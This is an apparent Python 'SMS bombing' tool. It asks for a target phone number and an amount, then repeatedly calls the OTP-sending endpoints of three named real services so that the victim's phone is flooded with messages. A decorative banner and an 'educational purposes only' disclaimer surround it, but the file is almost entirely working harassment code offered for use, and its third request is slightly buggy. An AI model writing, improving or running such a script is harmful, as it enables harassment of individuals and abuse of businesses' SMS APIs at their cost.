

# Logo 

import os 
import sys 
import time


os.system("clear")

print("\n\n\n\n")

ab="           \033[1;33mSystem loding...."

for c in ab:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0.1)

print("\n\n\n\n")


os.system("clear")

time.sleep(2)
print("\n\n")

ab="         \033[1;32mSuccessfully Loaded.!\n"

for c in ab:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0.1)
name=input("         \033[1;34mName:")

ab="         \033[1;31mHey "+name+", Be Ethical.."

for c in ab:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0.1)

print("\n\n")


time.sleep(2)

os.system("clear")

print(""" \033[1;31m


   _____  .__                 
  /  _  \\ |  | _____  ___  ___
 /  /_\\  \\|  | \\__  \\ \\  \\/  /
/    |    \\  |__/ __ \\_>    < 
\\____|__  /____(____  /__/\\_ \\
        \\/          \\/      \\/
        

\033[1;33m==============================================
\033[1;32m Owner: Alax Mahmud
 Github: Comming Soon
 Facebook: Alax Hridoy
Use this tools only for educational purposes
\033[1;33m==============================================            
        
        \033[0m

""")


print("""\033[1;32m==============================================\n""")


print("\033[1;31m\tPowerful Bombing Tools\n")

print("""\033[1;32m==============================================""")

import requests 

phone = input("Enter Target Number: ")

am=int(input("Enter Ammount: "))

sent=0

while sent<am:

	url = f"https://apibeta.iqra-live.com/api/v2/sent-otp/{phone}"
		
		
	response = requests.get(url)
		
	sent +=1
	if response.status_code == 200:
		print("\033[1;32mSMS Sent Successful.")
	else:
		    print("\033[1;31mSMS not successful.")
		    print("Status code:", response.status_code)
		    
	url1="https://developer.quizgiri.xyz/api/v2.0/send-otp"
		    
	data = {
		    "phone" : phone,
		    		
		    "fcm_token" : None,
		    
		    }
	response1 =requests.post(url1, json=data)
		   
	sent += 1
		   
	if response1.status_code == 200:
		    
		    print("\033[1;32mSMS Sent Successful.")
	else:
		    
		    print("\033[1;31mSMS not successful.")
		    print("Status code:", response1.status_code)
		   
	url2= "https://backoffice.ecourier.com.bd/api/web/individual-send-otp"
		   
	data={
		   	
		   "phone": phone
		   
		   }
		   
	response2 = requests.post(url,json=data)
		   
	if response2.status_code == 200:
		    
		    print("\033[1;33mSMS Sent Successful.")
	else:
		    
		   print("\033[1;31mSMS not successful.")
		   print("Status code:", response2.status_code)